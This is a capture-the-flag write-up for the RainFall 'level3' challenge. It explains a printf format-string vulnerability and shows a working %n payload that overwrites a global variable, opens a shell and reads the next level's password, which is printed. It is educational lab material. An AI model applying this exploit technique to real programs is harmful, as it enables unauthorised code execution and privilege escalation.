# level3

Let's launch the program:

```bash
level3@RainFall:~$ ./level3
hello world
hello world
```

The program repeats whatever is sent to stdin, but this time there is a catch! The program does not use `gets()` to get the data, but rather `fgets()` which is way safer, so no more buffer overflow...

```
objdump -M intel -D level3/level3 | egrep "<main>:" -A 6
0804851a <main>:
 804851a:       55                      push   ebp
 804851b:       89 e5                   mov    ebp,esp
 804851d:       83 e4 f0                and    esp,0xfffffff0
 8048520:       e8 7f ff ff ff          call   80484a4 <v>
 8048525:       c9                      leave  
 8048526:       c3                      ret
```

We can see that the main only calls the `v()` function.

```bash
080484a4 <v>:
 80484a4:       55                      push   ebp
 80484a5:       89 e5                   mov    ebp,esp
 80484a7:       81 ec 18 02 00 00       sub    esp,0x218
 80484ad:       a1 60 98 04 08          mov    eax,ds:0x8049860
 80484b2:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 80484b6:       c7 44 24 04 00 02 00    mov    DWORD PTR [esp+0x4],0x200
 80484bd:       00 
 80484be:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 80484c4:       89 04 24                mov    DWORD PTR [esp],eax
 80484c7:       e8 d4 fe ff ff          call   80483a0 <fgets@plt>
 80484cc:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 80484d2:       89 04 24                mov    DWORD PTR [esp],eax
 80484d5:       e8 b6 fe ff ff          call   8048390 <printf@plt>
 80484da:       a1 8c 98 04 08          mov    eax,ds:0x804988c
 80484df:       83 f8 40                cmp    eax,0x40
 80484e2:       75 34                   jne    8048518 <v+0x74>
 80484e4:       a1 80 98 04 08          mov    eax,ds:0x8049880
 80484e9:       89 c2                   mov    edx,eax
 80484eb:       b8 00 86 04 08          mov    eax,0x8048600
 80484f0:       89 54 24 0c             mov    DWORD PTR [esp+0xc],edx
 80484f4:       c7 44 24 08 0c 00 00    mov    DWORD PTR [esp+0x8],0xc
 80484fb:       00 
 80484fc:       c7 44 24 04 01 00 00    mov    DWORD PTR [esp+0x4],0x1
 8048503:       00 
 8048504:       89 04 24                mov    DWORD PTR [esp],eax
 8048507:       e8 a4 fe ff ff          call   80483b0 <fwrite@plt>
 804850c:       c7 04 24 0d 86 04 08    mov    DWORD PTR [esp],0x804860d
 8048513:       e8 a8 fe ff ff          call   80483c0 <system@plt>
 8048518:       c9                      leave
 8048519:       c3                      ret
```

Howevery what happens next is the problem, our string is printed by `printf()` with its first argument. Which means that, in theory, we should be able to print formatting symbols.

```bash
level3@RainFall:~$ ./level3
%x
200
```

Bingo! We can see here that formatting symbols work, now we can use `%n` to write data.

`%n` writes the number of bytes already written by `printf()`, so if provide `12345%n` as a buffer, `%n` will write `5` to the address that happened to be on the stack there.

```bash
./level3
%n
Segmentation fault (core dumped)
```

Well it looks like it somehow worked. Now we need to understand where and what to write.

From address `80484da` to `80484e2`, we see that the function `v()` loads the value in `0x804988c` to check if its equal to `0x40` before letting access to a `system()` call.

So we just need to write `64` to `0x804988c`

```python
print("\x8c\x98\x04\x08" + "o" * 35 + "%p" * 3 + "%n")
```

```bash
level3@RainFall:~$ python level3.py > data
level3@RainFall:~$ cat data - | ./level3
�ooooooooooooooooooooooooooooooooooo0x2000xb7fd1ac00xb7ff37d0
Wait what?!
whoami
level4
```

Why does it work?

The size of the address (`"\x8c\x98\x04\x08"`) is 4.

The size of the padding (`"o" * 35`) is 35.

Then we pop 3 values of the stack. Why? with trial and error we can see that it is at the 4th value that the format string writes itself, for us `0x804988c`. `"%p" * 3` Writes `0x2000xb7fd1ac00xb7ff37d0`, which is 25 characters.

So to summurize, we wrote 4 + 35 + 25 characters, which is 64. Now we can write our `%n` to write `64` into the memory.

```bash
cat data - | ./level3
�ooooooooooooooooooooooooooooooooooo0x2000xb7fd1ac00xb7ff37d0
Wait what?!
cd ../level4 
cat .pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

## .pass: b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa